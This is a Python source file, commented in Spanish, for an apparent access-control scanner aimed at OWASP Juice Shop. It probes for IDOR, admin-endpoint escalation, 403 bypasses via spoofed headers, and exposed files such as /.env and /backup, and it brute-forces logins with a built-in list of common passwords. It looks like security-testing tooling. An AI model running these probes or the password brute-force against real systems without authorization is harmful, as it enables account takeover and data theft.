import argparse
import json
import re
import requests


def _has_object_id(endpoint: str) -> bool:
    """Solo tiene sentido probar IDOR si la ruta referencia un objeto concreto."""
    value = str(endpoint or "")
    return bool(
        "{id}" in value
        or re.search(r"/\d+(?:/|$)", value)
        or re.search(
            r"/[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}(?:/|$)",
            value,
        )
    )


def test_idor(base_url, endpoint, token_victim, token_attacker, victim_id):
    findings = []
    if not _has_object_id(endpoint):
        return findings

    target_url = f"{base_url.rstrip('/')}{endpoint.replace('{id}', str(victim_id))}"
    headers = {"Authorization": f"Bearer {token_attacker}"}

    try:
        res = requests.get(target_url, headers=headers, timeout=10)

        # VALIDACIÓN ESTRICTA (Anti-Falsos Positivos)
        # 1. Debe ser 200 OK
        # 2. NO debe devolver HTML de error (como el de Juice Shop)
        # 3. Debe ser un JSON (Content-Type)
        # 4. El texto NO debe contener "UnauthorizedError" ni "Invalid token"
        is_html_error = "UnauthorizedError" in res.text or "Invalid token" in res.text
        is_json = "application/json" in res.headers.get("Content-Type", "")
        victim_can_read = True

        # Si disponemos del token de la víctima, comprobamos que el recurso
        # realmente le pertenece antes de atribuir un IDOR al atacante.
        if token_victim:
            try:
                victim_res = requests.get(
                    target_url,
                    headers={"Authorization": f"Bearer {token_victim}"},
                    timeout=10,
                )
                victim_can_read = victim_res.status_code == 200
            except Exception:
                victim_can_read = False

        if (
            res.status_code == 200
            and is_json
            and victim_can_read
            and not is_html_error
            and len(res.text) > 50
        ):
            findings.append({
                "id": "BAC-IDOR-001",
                "title": "IDOR (Insecure Direct Object Reference)",
                "severity": "CRITICAL",
                "exploitable": True,
                "endpoint": target_url,
                "evidence": f"El atacante (Token B) accedió al recurso de la víctima (ID: {victim_id}) con HTTP 200 y contenido JSON válido.",
                "cwe": "CWE-639",
                "owasp": "A01:2021 - Broken Access Control",
                "attack_chain": [
                    "1. Autenticarse como atacante",
                    f"2. Enviar GET a {target_url} usando el token del atacante",
                    f"3. El servidor devuelve datos privados del usuario víctima (ID {victim_id})"
                ]
            })
    except Exception:
        pass
    return findings


def test_vertical_escalation(base_url, token_attacker):
    findings = []
    admin_endpoints = ["/rest/admin/application-configuration", "/api/Users"]
    
    for ep in admin_endpoints:
        target_url = f"{base_url.rstrip('/')}{ep}"
        headers = {"Authorization": f"Bearer {token_attacker}"}
        try:
            res = requests.get(target_url, headers=headers, timeout=10)
            
            is_html_error = "UnauthorizedError" in res.text or "Invalid token" in res.text
            
            if res.status_code == 200 and not is_html_error and len(res.text) > 100:
                findings.append({
                    "id": "BAC-VERT-001",
                    "title": "Vertical Privilege Escalation",
                    "severity": "CRITICAL",
                    "exploitable": True,
                    "endpoint": target_url,
                    "evidence": f"Un usuario normal accedió al endpoint administrativo {ep} con HTTP 200 y contenido válido.",
                    "cwe": "CWE-269",
                    "owasp": "A01:2021 - Broken Access Control",
                    "attack_chain": [
                        "1. Autenticarse como usuario normal",
                        f"2. Enviar GET a {ep}",
                        "3. El servidor permite el acceso a funcionalidad de administrador"
                    ]
                })
        except Exception:
            pass
    return findings

def test_bypass_403(base_url, endpoint, token_attacker):
    findings = []
    target_url = f"{base_url.rstrip('/')}{endpoint}"
    
    bypass_techniques = [
        {"name": "Header X-Forwarded-For", "headers": {"Authorization": f"Bearer {token_attacker}", "X-Forwarded-For": "127.0.0.1"}},
        {"name": "Header X-Original-URL", "headers": {"Authorization": f"Bearer {token_attacker}", "X-Original-URL": endpoint}},
        {"name": "Path Traversal (Case)", "url": target_url.upper()},
        {"name": "Path Traversal (Dot)", "url": target_url + "/."},
    ]
    
    try:
        res_base = requests.get(target_url, headers={"Authorization": f"Bearer {token_attacker}"}, timeout=5)
        if res_base.status_code not in [401, 403]:
            return findings
            
        for tech in bypass_techniques:
            req_url = tech.get("url", target_url)
            req_headers = tech.get("headers", {"Authorization": f"Bearer {token_attacker}"})
            
            res = requests.get(req_url, headers=req_headers, timeout=5)
            is_html_error = "UnauthorizedError" in res.text or "Invalid token" in res.text
            
            if res.status_code == 200 and not is_html_error and len(res.text) > 50:
                findings.append({
                    "id": "BAC-BYPASS-001",
                    "title": f"403 Bypass usando {tech['name']}",
                    "severity": "HIGH",
                    "exploitable": True,
                    "endpoint": target_url,
                    "evidence": f"El endpoint devolvió 403 inicialmente, pero la técnica '{tech['name']}' devolvió 200 OK con contenido válido.",
                    "cwe": "CWE-288",
                    "owasp": "A01:2021 - Broken Access Control",
                    "attack_chain": [
                        f"1. Intentar acceder a {endpoint} (Devuelve 403)",
                        f"2. Aplicar manipulación: {tech['name']}",
                        "3. El servidor procesa la petición incorrectamente y otorga acceso"
                    ]
                })
                break
    except Exception:
        pass
    return findings

def brute_force_login(base_url, email_target, wordlist=None):
    """Intenta romper la contraseña de un usuario probando un diccionario."""
    findings = []
    if not wordlist:
        wordlist = ["admin123", "password", "123456", "admin", "juice", "demo", "test", "jim", "bender"]
        
    login_url = f"{base_url.rstrip('/')}/rest/user/login"
    
    for password in wordlist:
        try:
            res = requests.post(login_url, json={"email": email_target, "password": password}, timeout=5)
            if res.status_code == 200 and "authentication" in res.text:
                findings.append({
                    "id": "BAC-AUTH-001",
                    "title": "Broken Authentication (Weak Password)",
                    "severity": "CRITICAL",
                    "exploitable": True,
                    "endpoint": login_url,
                    "evidence": f"Credenciales válidas encontradas por fuerza bruta: {email_target}:{password}",
                    "cwe": "CWE-521",
                    "owasp": "A07:2021 - Identification and Authentication Failures",
                    "attack_chain": [
                        f"1. Enviar petición POST a {login_url}",
                        f"2. Probar contraseñas comunes para el usuario {email_target}",
                        f"3. La contraseña '{password}' es válida",
                        "4. El atacante obtiene un token JWT válido y suplanta al usuario"
                    ]
                })
                break # Si encuentra la contraseña, deja de probar
        except Exception:
            pass
            
    return findings


def test_exposed_files(base_url):
    findings = []
    sensitive_paths = ["/ftp", "/ftp/acquisitions.md", "/ftp/legal.md", "/robots.txt", "/.env", "/backup"]
    
    for path in sensitive_paths:
        target_url = f"{base_url.rstrip('/')}{path}"
        try:
            res = requests.get(target_url, timeout=5)
            
            # VALIDACIÓN ESTRICTA:
            # 1. Status 200
            # 2. Que no sea un error
            # 3. Que NO sea HTML (la SPA de Juice Shop devuelve HTML para todo)
            is_html = "<html" in res.text.lower() or "<!doctype html" in res.text.lower()
            
            # Permitir HTML solo si es un listado de directorios real (como el /ftp de Juice Shop)
            is_directory_listing = "Directory listing for" in res.text or "Index of /" in res.text
            
            if res.status_code == 200 and "not found" not in res.text.lower():
                if not is_html or is_directory_listing or path.endswith(".txt") or path.endswith(".md"):
                    findings.append({
                    "id": "BAC-FILE-001",
                    "title": "Exposed Sensitive File or Directory",
                    "severity": "HIGH",
                    "exploitable": True,
                    "endpoint": target_url,
                    "evidence": f"El recurso {path} es accesible públicamente sin autenticación (HTTP 200).",
                    "cwe": "CWE-200",
                    "owasp": "A01:2021 - Broken Access Control",
                    "attack_chain": [
                        "1. Navegar directamente al recurso sin credenciales",
                        f"2. Acceder a {path}",
                        "3. Descargar archivos sensibles (backups, configuraciones, notas)"
                    ]
                })
        except Exception:
            pass
    return findings

def main():
    parser = argparse.ArgumentParser(description="Access Control Prober")
    parser.add_argument("--base-url", required=True)
    parser.add_argument("--endpoint", required=True)
    parser.add_argument("--victim-id", required=True)
    parser.add_argument("--token-victim", required=False, default="")
    parser.add_argument("--token-attacker", required=True)
    parser.add_argument("--email-target", required=False, default="")
    args = parser.parse_args()

    # La salida debe ser JSON puro: el Validate Agent la parsea con json.loads().
    findings = []

    findings.extend(test_idor(args.base_url, args.endpoint, args.token_victim, args.token_attacker, args.victim_id))
    findings.extend(test_vertical_escalation(args.base_url, args.token_attacker))
    findings.extend(test_bypass_403(args.base_url, args.endpoint, args.token_attacker))
    findings.extend(test_exposed_files(args.base_url))

    if args.email_target:
        findings.extend(brute_force_login(args.base_url, args.email_target))

    by_severity = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
    for f in findings:
        by_severity[f["severity"]] += 1

    report = {
        "tool": "access_control_prober",
        "finding_type": "Broken Access Control",
        "summary": {
            "total_findings": len(findings),
            "by_severity": by_severity
        },
        "findings": findings
    }
    
    print(json.dumps(report, indent=2), flush=True)

if __name__ == "__main__":
    main()